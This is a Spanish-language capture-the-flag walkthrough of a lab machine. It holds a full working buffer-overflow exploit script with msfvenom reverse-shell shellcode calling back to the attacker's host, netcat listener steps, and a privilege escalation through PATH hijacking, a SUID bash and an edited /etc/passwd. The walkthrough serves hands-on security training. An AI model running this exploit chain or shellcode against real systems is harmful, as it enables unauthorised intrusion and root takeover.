# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 3000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 22:04 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: software installation
20201/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     Enter data: Data received correctly
|   NULL: 
|_    Enter data:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port20201-TCP:V=7.94SVN%I=7%D=11/29%Time=674A64AB%P=x86_64-pc-linux-gnu
SF:%r(NULL,C,"Enter\x20data:\x20")%r(GenericLines,24,"Enter\x20data:\x20Da
SF:ta\x20received\x20correctly\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
```

observo 2 puertos, el 80 (HTTP) y el puerto 20201 con un servicio desconocido por TCP, asi que comienzo chequeando la web

![image](https://github.com/user-attachments/assets/fa6b2dca-ded0-4594-9cc3-119e69b90de9)

al pulsar en descargar se baja un binario

![image](https://github.com/user-attachments/assets/d2c6375f-7016-4a08-9622-e740ce12f853)

ejecuto el binario y se coloca en escucha por el puerto 20201, el mismo del reporte de `nmap` por lo que es muy probable sea el mismo binario ejecutandose en el servidor web,
chequeare si es vulnerable a un desbordamiento de buffer (Buffer OverFLow)

![image](https://github.com/user-attachments/assets/98999e94-97e2-4d93-b1a8-524e0c28a8cb)

ha ocurrido un desbordamiento de buffer `segmentation fault  ./secure_software` asi que intentare explotarlo

# Explotando BOF

comenzamos chequeando las protecciones que tiene activo el binario

```ruby
checksec --file=secure_software
```

![image](https://github.com/user-attachments/assets/79e0f196-a02a-42e3-b291-206415a50ad7)

ya por aqui podemos ver que seria posible la carga una `shellcode` ya que `NX` esta desactivado, ahora ejecutamos el binario con el depurador `gdb`

```ruby
gdb ./secure_software -q
```

y corremos el binario `run secure_software`

![image](https://github.com/user-attachments/assets/e3b7019a-4023-4503-a890-5dea0e2e80ef)

el siguiente paso es calcular el `offset` y para esto hago uso de 2 exploit de `metasploit`

```bash
1) /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
2) /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

ejecutamos el primer exploit para generar una cadena que enviaremos al binario, primero intentare con una cadena de logitud 500

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
```
```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

esta cadena ahora se la envio al binario ya sea por netcat o telnet (da igual)

![image](https://github.com/user-attachments/assets/c486eb05-80da-455c-9442-9921474ff00d)

observamos que el binario a petado y nos muestra la direccion `0x41306b41` que sera la que le pasemos al segundo exploit de `metasploit`

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41306b41
```

![image](https://github.com/user-attachments/assets/fbdea06f-26fc-4174-b387-42adde53c2dc)


ya tenemos el `offset` = `300`, ahora pruebo si logro controlar el `eip`, vuelvo a correr el binario en el dupurador y le envio el siguiente payload

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

![image](https://github.com/user-attachments/assets/f05a0cf8-8fd5-4e97-92ac-71c07310281d)

![image](https://github.com/user-attachments/assets/1faa7d58-fe13-4b9d-aaef-4149f140508a)

tengo control sobre el `eip` ya que las BBBB corresponden a `0x42424242` (si queremos validar, podemos enviar en vez de B, C que se representaria con 0x43434343)

![image](https://github.com/user-attachments/assets/b8464673-ea5e-462a-bed0-fd68e81b4e13)

ahora necesitamos saber a donde se dirige lo que se introduce despues del `EIP` (voy a introducir muchas "C"), genero el payload con el siguiente script de `python`

```ruby
python2 -c 'print("A"*300 + "B"*4 + "C"*500)'
```
```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```
```bash
"A"*300 = con esto desbordamos el buffer y alcanzamos el EIP
"B"*4   = lo que registramos en el EIP
"C"*500 = lo que registraremos despues del EIP
```

enviamos el payload al binario

![image](https://github.com/user-attachments/assets/af15b464-216e-4289-b110-feda457a6b3d)

`x/300xw $esp`

![image](https://github.com/user-attachments/assets/dec4832a-3408-45b9-86ec-366fd2904e91)

las 500 `C` que envie se han registrado al comienzo de la pila. Ahora necesito que el flujo del programa vaya despues del `EIP` al comienzo de la pila donde se encontrara la shellcode que
depsues cargare, para hacer que el flujo salte desde la EIP al comeinzo de la pila necesito la instruccion `jmp esp` donde:

```bash
jmp = Es una instrucción de salto en ensamblador que cambia el flujo de ejecución del programa a la dirección especificada
esp = Es el registro de puntero de pila en la arquitectura x86. Este registro apunta a la parte superior de la pila en memoria
```
ahora localizamos la direccion de inicio de la pila con `objdump`

```bash
objdump -d secure_software |grep jmp |grep esp
```

![image](https://github.com/user-attachments/assets/ea9b0e33-3522-40c1-a225-b1b50af8c2a7)

obtenemos la direccion que esta representada por `8049213` (0x8049213), esta direccion sera la que escribiremos en el `EIP`, en resumen tenemos:

```bash
offset = 300
EIP = \x13\x92\x04\x08

NOTA= La dirección debe ingresarse al revés. La razón de esto es que las computadoras actuales son little-endian
(el byte menos significativo se almacena en la dirección más pequeña), por lo que cada entrada debe ingresarse al revés.
```
ahora nos falta la `shellcode` que la generamos con `msfvenom`

```ruby
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -b '\x00\x0a\x0d' -f py

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 479 bytes
buf =  b""
buf += b"\xbb\x87\xf8\x24\x62\xd9\xcc\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x12\x31\x5a\x12\x83\xc2\x04\x03\xdd"
buf += b"\xf6\xc6\x97\xd0\xdd\xf0\xbb\x41\xa1\xad\x51\x67"
buf += b"\xac\xb3\x16\x01\x63\xb3\xc4\x94\xcb\x8b\x27\xa6"
buf += b"\x65\x8d\x4e\xce\xd9\x7c\xb1\x0f\x4a\x7d\xb1\x1e"
buf += b"\xd6\x08\x50\x90\x80\x5a\xc2\x83\xff\x58\x6d\xc2"
buf += b"\xcd\xdf\x3f\x6c\xa0\xf0\xcc\x04\x54\x20\x1c\xb6"
buf += b"\xcd\xb7\x81\x64\x5d\x41\xa4\x38\x6a\x9c\xa7"
```

por gusto y comodida dejare la `shellcode` en una linea (aunque puede dejarse tal cual esta sin ningun problema)

```ruby
shellcode = b"" + b"\xbb\x87\xf8\x24\x62\xd9\xcc\xd9\x74\x24\xf4\x5a" + b"\x33\xc9\xb1\x12\x31\x5a\x12\x83\xc2\x04\x03\xdd" + b"\xf6\xc6\x97\xd0\xdd\xf0\xbb\x41\xa1\xad\x51\x67" + b"\xac\xb3\x16\x01\x63\xb3\xc4\x94\xcb\x8b\x27\xa6" + b"\x65\x8d\x4e\xce\xd9\x7c\xb1\x0f\x4a\x7d\xb1\x1e" + b"\xd6\x08\x50\x90\x80\x5a\xc2\x83\xff\x58\x6d\xc2" + b"\xcd\xdf\x3f\x6c\xa0\xf0\xcc\x04\x54\x20\x1c\xb6" + b"\xcd\xb7\x81\x64\x5d\x41\xa4\x38\x6a\x9c\xa7"
```
ya que tengo el `offset`, el `EIP` y la `shellcode` construire el exploit para explotar el BOF

```python
import socket
ip_addr = "127.0.0.1"
port = 20201
offset = 300
full_buffer = b"A"*offset       # Llenamos el buffer para alcanzar el EIP (enviamos 300 A)
eip = b"\x13\x92\x04\x08"       # esta direccion hara que el flujo del programa se redirija al comienzo de la pila donde inyectaremos la shellcode
des_eip = b"\x90"*50 # nop's    # agregamos NOP's despues del EIP y antes de la shellcode para asegurarnos que esta ultima se ejecute correctamente

# nuestra shellcode
shellcode = b"" + b"\xbb\x87\xf8\x24\x62\xd9\xcc\xd9\x74\x24\xf4\x5a" + b"\x33\xc9\xb1\x12\x31\x5a\x12\x83\xc2\x04\x03\xdd" + b"\xf6\xc6\x97\xd0\xdd\xf0\xbb\x41\xa1\xad\x51\x67" + b"\xac\xb3\x16\x01\x63\xb3\xc4\x94\xcb\x8b\x27\xa6" + b"\x65\x8d\x4e\xce\xd9\x7c\xb1\x0f\x4a\x7d\xb1\x1e" + b"\xd6\x08\x50\x90\x80\x5a\xc2\x83\xff\x58\x6d\xc2" + b"\xcd\xdf\x3f\x6c\xa0\xf0\xcc\x04\x54\x20\x1c\xb6" + b"\xcd\xb7\x81\x64\x5d\x41\xa4\x38\x6a\x9c\xa7"

# construimos el payload final >>> payload = [buffer] + [EIP] + [NOP's] + [shellcode]
payload = full_buffer + eip + des_eip + shellcode

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creamos un socket
sock.connect((ip_addr, port)) # conexion
sock.recv(1024) # recibimos datos
sock.send(payload) # enviamos el payload
sock.close() # cerramos el socket
```

ya solo queda probar si funciona el script. Por un lado corro el binario en el depurador, por otro lado me coloco en escucha con `netcat` y por ultimo ejecuto el script

https://github.com/user-attachments/assets/71d7b770-7702-4a73-a324-d4dda95ec96e

como el script funciona perfectamente, ahora solo me queda apuntarlo contra el servidor, editando el script cambiando la ip por la del servidor web

![image](https://github.com/user-attachments/assets/ac2501e8-3bb4-4390-9a5d-d2a9a2f723f1)

ya cambiada la ip, nos ponemos en escucha por `netcat` `nc -lnvp 4444` y ejecutamos el script

![image](https://github.com/user-attachments/assets/123f8cf6-09a5-4ced-9969-c444a40b08c9)

`hemos accedido al sistema!!!`

# Escalada de Privilegios

### securedev

tratamiento de la tty

```bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```
existe un usuario mas en el sistema `johntheripper`, si reviso el directorio del user actual, parece que consigo credenciales del siguiente user

![image](https://github.com/user-attachments/assets/f457aec4-dfe4-437c-9968-e369182cb214)


las pruebo contra el user `johntheripper` pero no es la password, intento ver si puedo crackear el hash pero tampoco, sigo buscando en el sistema

```ruby
find / -type f -user johntheripper 2>/dev/null
```

![image](https://github.com/user-attachments/assets/89b5eecc-1a33-4f57-9363-c1dd225e82fb)

consigo una lista de palabras o posibles password para el user `johntheripper` asi que por no se muchas, las compruebo manual

![image](https://github.com/user-attachments/assets/ab58a0ed-5975-41f9-aa92-2dd6afa8ef1d)

### johntheripper

en el directorio este user me consigo un binario con el `BIT SUID` que al ejecutarlo solo lista el contenido del directorio actual

![image](https://github.com/user-attachments/assets/c17838da-79ac-45bf-b50c-f097f079e9e9)

realizare una prueba rapida `PATH Hijacking` y sino funciona lo examino a mas profundidad, pero por ahora probare esto por la rareza de que el binario actue como el comando `ls`

```ruby
export PATH=/home/johntheripper:$PATH
```

ahora nos creamos un archivo "ls" con el siguiente contenido

```bash
#!/bin/bash

whoami
```
le damos permisos de ejecucion

```ruby
chmod +x ls
```

y ejecutamos el binario `show_files`

![image](https://github.com/user-attachments/assets/6f7523af-9d68-410f-9bc8-1c31953ad186)

resulta ser vulnerable a un `PATH Hijacking` como sospeche desde un principio, vuelvo editar el archivo "ls" pero esta vez no tendra un `whoami` sino que tendra `chmod u+s /bin/bash`
para escalar a `root`

![image](https://github.com/user-attachments/assets/961440d0-e35b-433b-aa94-3f17bbe8566b)

### `root`

ahora aparentemente como `root` procedo a editar el archivo `/etc/passwd` y elimino la `x` que tiene `root` en su linea, despues de esto vuelvo al user `johntheripper` con un `exit`
para terminar de escalar a `root` por completo con un `su root`

![image](https://github.com/user-attachments/assets/59aecf89-c85e-44bf-b8ee-a40adc255bfe)





